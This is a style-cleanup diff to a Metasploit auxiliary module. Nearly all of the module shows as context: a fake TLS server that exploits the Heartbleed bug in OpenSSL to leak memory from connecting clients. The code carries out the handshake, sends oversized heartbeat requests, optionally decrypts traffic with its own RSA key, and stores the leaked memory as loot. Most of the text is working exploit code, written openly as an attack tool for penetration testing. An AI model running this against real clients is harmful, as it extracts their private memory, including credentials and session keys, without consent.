@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,18 +7,17 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
   def initialize
     super(
       'Name'           => 'OpenSSL Heartbeat (Heartbleed) Client Memory Exposure',
-      'Description'    => %q{
+      'Description'    => %q(
         This module provides a fake SSL service that is intended to
         leak memory from client systems as they connect. This module is
         hardcoded for using the AES-128-CBC-SHA1 cipher.
-      },
+      ),
       'Author'         =>
         [
           'Neel Mehta', # Vulnerability discovery
@@ -42,18 +42,19 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 8443 ]),
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 8443 ]),
         OptInt.new('HEARTBEAT_LIMIT', [true, "The number of kilobytes of data to capture at most from each client", 512]),
         OptInt.new('HEARTBEAT_READ', [true, "The number of bytes to leak in the heartbeat response", 65535]),
         OptBool.new('NEGOTIATE_TLS', [true, "Set this to true to negotiate TLS and often leak more data at the cost of CA validation", false])
-      ], self.class)
+      ], self.class
+    )
   end
 
   # Initialize the client state and RSA key for this session
   def setup
     super
     @state    = {}
-    @cert_key = OpenSSL::PKey::RSA.new(1024){ } if negotiate_tls?
+    @cert_key = OpenSSL::PKey::RSA.new(1024) {} if negotiate_tls?
   end
 
   # Setup the server module and start handling requests
@@ -74,17 +75,17 @@ class MetasploitModule < Msf::Auxiliary
 
   # Determine whether we should negotiate TLS or not
   def negotiate_tls?
-    !! datastore['NEGOTIATE_TLS']
+    !!datastore['NEGOTIATE_TLS']
   end
 
   # Initialize a new state for every client
   def on_client_connect(c)
     @state[c] = {
-      :name          => "#{c.peerhost}:#{c.peerport}",
-      :ip            => c.peerhost,
-      :port          => c.peerport,
-      :heartbeats    => "",
-      :server_random => [Time.now.to_i].pack("N") + Rex::Text.rand_text(28)
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
+      heartbeats: "",
+      server_random: [Time.now.to_i].pack("N") + Rex::Text.rand_text(28)
     }
     print_status("#{@state[c][:name]} Connected")
   end
@@ -92,7 +93,7 @@ class MetasploitModule < Msf::Auxiliary
   # Buffer messages and parse them once they are fully received
   def on_client_data(c)
     data = c.get_once
-    return if not data
+    return unless data
     @state[c][:buff] ||= ""
     @state[c][:buff] << data
     process_request(c)
@@ -100,9 +101,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # Extract TLS messages from the buffer and process them
   def process_request(c)
-
     # Make this slightly harder to DoS
-    if @state[c][:buff].to_s.length > (1024*128)
+    if @state[c][:buff].to_s.length > (1024 * 128)
       print_status("#{@state[c][:name]} Buffer limit reached, dropping connection")
       c.close
       return
@@ -114,9 +114,9 @@ class MetasploitModule < Msf::Auxiliary
 
       message_type, message_ver, message_len = @state[c][:buff].unpack("Cnn")
       break unless message_len
-      break unless @state[c][:buff].length >= message_len+5
+      break unless @state[c][:buff].length >= message_len + 5
 
-      mesg = @state[c][:buff].slice!(0, message_len+5)
+      mesg = @state[c][:buff].slice!(0, message_len + 5)
 
       if @state[c][:encrypted]
         process_openssl_encrypted_request(c, mesg)
@@ -130,10 +130,10 @@ class MetasploitModule < Msf::Auxiliary
   def process_openssl_cleartext_request(c, data)
     message_type, message_version, protocol_version = data.unpack("Cn@9n")
 
-    if message_type == 0x15 and data.length >= 7
-      message_level, message_reason = data[5,2].unpack("CC")
+    if (message_type == 0x15) && (data.length >= 7)
+      message_level, message_reason = data[5, 2].unpack("CC")
       print_status("#{@state[c][:name]} Alert Level #{message_level} Reason #{message_reason}")
-      if message_level == 2 and message_reason == 0x30
+      if (message_level == 2) && (message_reason == 0x30)
         print_status("#{@state[c][:name]} Client rejected our certificate due to unknown CA")
         return
       end
@@ -146,22 +146,22 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless message_type == 0x18
-      message_code = data[5,1].to_s.unpack("C").first
-      vprint_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
+      message_code = data[5, 1].to_s.unpack("C").first
+      vprint_status("#{@state[c][:name]} Message #{sprintf('type %.2x v%.4x %.2x', message_type, message_version, message_code)}")
     end
 
     # Process the Client Hello
     unless @state[c][:received_hello]
 
-      unless (message_type == 0x16 and data.length > 43 and message_code == 0x01)
-        print_status("#{@state[c][:name]} Expected a Client Hello, received #{sprintf("type %.2x code %.2x", message_type, message_code)}")
+      unless (message_type == 0x16) && data.length > 43 && (message_code == 0x01)
+        print_status("#{@state[c][:name]} Expected a Client Hello, received #{sprintf('type %.2x code %.2x', message_type, message_code)}")
         return
       end
 
       print_status("#{@state[c][:name]} Processing Client Hello...")
 
       # Extract the client_random needed to compute the master key
-      @state[c][:client_random]  = data[11,32]
+      @state[c][:client_random]  = data[11, 32]
       @state[c][:received_hello] = true
 
       print_status("#{@state[c][:name]} Sending Server Hello...")
@@ -172,7 +172,7 @@ class MetasploitModule < Msf::Auxiliary
     # If we are negotiating TLS, handle Client Key Exchange/Change Cipher Spec
     if negotiate_tls?
       # Process the Client Key Exchange
-      if message_type == 0x16 and data.length > 11 and message_code == 0x10
+      if (message_type == 0x16) && data.length > 11 && (message_code == 0x10)
         print_status("#{@state[c][:name]} Processing Client Key Exchange...")
         premaster_length = data[9, 2].unpack("n").first
 
@@ -181,13 +181,17 @@ class MetasploitModule < Msf::Auxiliary
           premaster_encrypted = data[11, premaster_length]
 
           # Decrypt the pre-master secret using our RSA key
-          premaster_clear = @cert_key.private_decrypt(premaster_encrypted) rescue nil
+          premaster_clear = begin
+                              @cert_key.private_decrypt(premaster_encrypted)
+                            rescue
+                              nil
+                            end
           @state[c][:premaster] = premaster_clear if premaster_clear
         end
       end
 
       # Process the Change Cipher Spec and switch to encrypted communications
-      if message_type == 0x14 and message_code == 0x01
+      if (message_type == 0x14) && (message_code == 0x01)
         print_status("#{@state[c][:name]} Processing Change Cipher Spec...")
         initialize_encryption_keys(c)
         return
@@ -201,15 +205,15 @@ class MetasploitModule < Msf::Auxiliary
 
       # Process cleartext heartbeat replies
       if message_type == 0x18
-        vprint_status("#{@state[c][:name]} Heartbeat received (#{data.length-5} bytes) [#{@state[c][:heartbeats].length} bytes total]")
-        @state[c][:heartbeats] << data[5, data.length-5]
+        vprint_status("#{@state[c][:name]} Heartbeat received (#{data.length - 5} bytes) [#{@state[c][:heartbeats].length} bytes total]")
+        @state[c][:heartbeats] << data[5, data.length - 5]
       end
 
       # Full up on heartbeats, disconnect the client
       if @state[c][:heartbeats].length >= heartbeat_limit
         print_status("#{@state[c][:name]} Heartbeats received [#{@state[c][:heartbeats].length} bytes total]")
         store_captured_heartbeats(c)
-        c.close()
+        c.close
       end
     end
   end
@@ -221,15 +225,15 @@ class MetasploitModule < Msf::Auxiliary
     return if @state[c][:shutdown]
     return unless data.length > 5
 
-    buff = decrypt_data(c, data[5, data.length-5])
+    buff = decrypt_data(c, data[5, data.length - 5])
     unless buff
       print_status("#{@state[c][:name]} Failed to decrypt, giving up on this client")
       c.close
       return
     end
 
-    message_code = buff[0,1].to_s.unpack("C").first
-    vprint_status("#{@state[c][:name]} Message #{sprintf("type %.2x v%.4x %.2x", message_type, message_version, message_code)}")
+    message_code = buff[0, 1].to_s.unpack("C").first
+    vprint_status("#{@state[c][:name]} Message #{sprintf('type %.2x v%.4x %.2x', message_type, message_version, message_code)}")
 
     if message_type == 0x16
       print_status("#{@state[c][:name]} Processing Client Finished...")
@@ -250,13 +254,13 @@ class MetasploitModule < Msf::Auxiliary
     if @state[c][:heartbeats].length >= heartbeat_limit
       print_status("#{@state[c][:name]} Encrypted heartbeats received [#{@state[c][:heartbeats].length} bytes total]")
       store_captured_heartbeats(c)
-      c.close()
+      c.close
     end
   end
 
   # Dump captured memory to a file on disk using the loot API
   def store_captured_heartbeats(c)
-    if @state[c][:heartbeats].length > 0
+    unless @state[c][:heartbeats].empty?
       begin
         path = store_loot(
           "openssl.heartbleed.client",
@@ -268,19 +272,21 @@ class MetasploitModule < Msf::Auxiliary
         )
         print_status("#{@state[c][:name]} Heartbeat data stored in #{path}")
       rescue ::Interrupt
-        raise $!
+        raise $ERROR_INFO
       rescue ::Exception
-        print_status("#{@state[c][:name]} Heartbeat data could not be stored: #{$!.class} #{$!}")
+        print_status("#{@state[c][:name]} Heartbeat data could not be stored: #{$ERROR_INFO.class} #{$ERROR_INFO}")
       end
 
       # Report the memory disclosure as a vulnerability on the host
-      report_vuln({
-        :host => @state[c][:ip],
-        :name => self.name,
-        :info => "Module #{self.fullname} successfully dumped client memory contents",
-        :refs => self.references,
-        :exploited_at => Time.now.utc
-      }) rescue nil # Squash errors related to ip => 127.0.0.1 and the like
+      begin
+        report_vuln(host: @state[c][:ip],
+                    name: name,
+                    info: "Module #{fullname} successfully dumped client memory contents",
+                    refs: references,
+                    exploited_at: Time.now.utc)
+      rescue
+        nil
+      end # Squash errors related to ip => 127.0.0.1 and the like
     end
 
     # Clear the heartbeat array
@@ -291,22 +297,19 @@ class MetasploitModule < Msf::Auxiliary
   # Delete the state on connection close
   def on_client_close(c)
     # Do we have any pending heartbeats to save?
-    if @state[c][:heartbeats].length > 0
-      store_captured_heartbeats(c)
-    end
+    store_captured_heartbeats(c) unless @state[c][:heartbeats].empty?
     @state.delete(c)
   end
 
   # Send an OpenSSL Server Hello response
   def openssl_send_server_hello(c, hello, version)
-
     # If encrypted, use the TLS_RSA_WITH_AES_128_CBC_SHA; otherwise, use the
     # first cipher suite sent by the client.
-    if @state[c][:encrypted]
-      cipher = "\x00\x2F"
-    else
-      cipher = hello[46, 2]
-    end
+    cipher = if @state[c][:encrypted]
+               "\x00\x2F"
+             else
+               hello[46, 2]
+             end
 
     # Create the Server Hello response
     extensions =
@@ -320,7 +323,7 @@ class MetasploitModule < Msf::Auxiliary
       "\x00" +                     # Compression Method (none)
       [extensions.length].pack('n') + extensions
 
-    server_hello = [0x02].pack("C") + [ server_hello_payload.length ].pack("N")[1,3] + server_hello_payload
+    server_hello = [0x02].pack("C") + [ server_hello_payload.length ].pack("N")[1, 3] + server_hello_payload
 
     msg1 = "\x16" + [version].pack('n') + [server_hello.length].pack("n") + server_hello
     c.put(msg1)
@@ -365,31 +368,31 @@ class MetasploitModule < Msf::Auxiliary
 
     subject_cn = Rex::Text.rand_hostname
     subject = OpenSSL::X509::Name.new([
-        ["C","US"],
-        ['ST', Rex::Text.rand_state()],
-        ["L", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
-        ["O", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
-        ["CN", subject_cn],
-      ])
+                                        ["C", "US"],
+                                        ['ST', Rex::Text.rand_state],
+                                        ["L", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
+                                        ["O", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
+                                        ["CN", subject_cn]
+                                      ])
     issuer = OpenSSL::X509::Name.new([
-        ["C","US"],
-        ['ST', Rex::Text.rand_state()],
-        ["L", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
-        ["O", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
-        ["CN", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
-      ])
+                                       ["C", "US"],
+                                       ['ST', Rex::Text.rand_state],
+                                       ["L", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
+                                       ["O", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],
+                                       ["CN", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize]
+                                     ])
 
     cert.subject = subject
     cert.issuer = issuer
     cert.not_before = Time.now - (3600 * 24 * 365) + rand(3600 * 14)
     cert.not_after = Time.now + (3600 * 24 * 365) + rand(3600 * 14)
     cert.public_key = key.public_key
-    ef = OpenSSL::X509::ExtensionFactory.new(nil,cert)
+    ef = OpenSSL::X509::ExtensionFactory.new(nil, cert)
     cert.extensions = [
-      ef.create_extension("basicConstraints","CA:FALSE"),
-      ef.create_extension("subjectKeyIdentifier","hash"),
-      ef.create_extension("extendedKeyUsage","serverAuth"),
-      ef.create_extension("keyUsage","keyEncipherment,dataEncipherment,digitalSignature")
+      ef.create_extension("basicConstraints", "CA:FALSE"),
+      ef.create_extension("subjectKeyIdentifier", "hash"),
+      ef.create_extension("extendedKeyUsage", "serverAuth"),
+      ef.create_extension("keyUsage", "keyEncipherment,dataEncipherment,digitalSignature")
     ]
     ef.issuer_certificate = cert
     cert.add_extension ef.create_extension("authorityKeyIdentifier", "keyid:always,issuer:always")
@@ -408,9 +411,7 @@ class MetasploitModule < Msf::Auxiliary
       buff << cipher.final
 
       # Trim the trailing MAC signature off the buffer
-      if buff.length >= 20
-        return buff[0, buff.length-20]
-      end
+      return buff[0, buff.length - 20] if buff.length >= 20
     rescue ::OpenSSL::Cipher::CipherError => e
       print_status("#{@state[c][:name]} Decryption failed: #{e}")
     end
@@ -431,19 +432,17 @@ class MetasploitModule < Msf::Auxiliary
 
     key_block = tls1_prf(
       @state[c][:master],
-      "key expansion" +  @state[c][:server_random] + @state[c][:client_random],
+      "key expansion" + @state[c][:server_random] + @state[c][:client_random],
       (20 * 2) + (16 * 4)
     )
 
     # Extract the MAC, encryption, and IV from the keyblock
-    @state[c].update({
-      :client_write_mac_key => key_block.slice!(0, 20),
-      :server_write_mac_key => key_block.slice!(0, 20),
-      :client_write_key     => key_block.slice!(0, 16),
-      :server_write_key     => key_block.slice!(0, 16),
-      :client_iv            => key_block.slice!(0, 16),
-      :server_iv            => key_block.slice!(0, 16),
-    })
+    @state[c].update(client_write_mac_key: key_block.slice!(0, 20),
+                     server_write_mac_key: key_block.slice!(0, 20),
+                     client_write_key: key_block.slice!(0, 16),
+                     server_write_key: key_block.slice!(0, 16),
+                     client_iv: key_block.slice!(0, 16),
+                     server_iv: key_block.slice!(0, 16))
 
     client_cipher = OpenSSL::Cipher.new('aes-128-cbc')
     client_cipher.key = @state[c][:client_write_key]
@@ -457,23 +456,21 @@ class MetasploitModule < Msf::Auxiliary
     server_cipher.encrypt
     server_mac = OpenSSL::HMAC.new(@state[c][:server_write_mac_key], OpenSSL::Digest.new('sha1'))
 
-    @state[c].update({
-      :client_enc => client_cipher,
-      :client_mac => client_mac,
-      :server_enc => server_cipher,
-      :server_mac => server_mac
-    })
+    @state[c].update(client_enc: client_cipher,
+                     client_mac: client_mac,
+                     server_enc: server_cipher,
+                     server_mac: server_mac)
 
     true
   end
 
   # Determine the master key from the premaster and client/server randoms
   def tls1_calculate_master_key(c)
-    return unless (
-      @state[c][:premaster]     and
-      @state[c][:client_random] and
+    return unless
+      @state[c][:premaster]     &&
+      @state[c][:client_random] &&
       @state[c][:server_random]
-    )
+
     tls1_prf(
       @state[c][:premaster],
       "master secret" + @state[c][:client_random] + @state[c][:server_random],
@@ -489,9 +486,7 @@ class MetasploitModule < Msf::Auxiliary
     blen = (input_secret.length / 2.0).ceil
     s1 = input_secret[0, blen]
     s2_index = blen
-    if input_secret.length % 2 != 0
-      s2_index -= 1
-    end
+    s2_index -= 1 if input_secret.length.odd?
     s2 = input_secret[s2_index, blen]
 
     # Hash the first part with MD5
@@ -501,7 +496,7 @@ class MetasploitModule < Msf::Auxiliary
     out2 = tls1_p_hash('sha1', s2, input_label, output_length).unpack("C*")
 
     # XOR the results together
-    [*(0..out1.length-1)].map {|i| out1[i] ^ out2[i] }.pack("C*")
+    [*(0..out1.length - 1)].map { |i| out1[i] ^ out2[i] }.pack("C*")
   end
 
   # Used by tls1_prf to generate arbitrary amounts of session key data
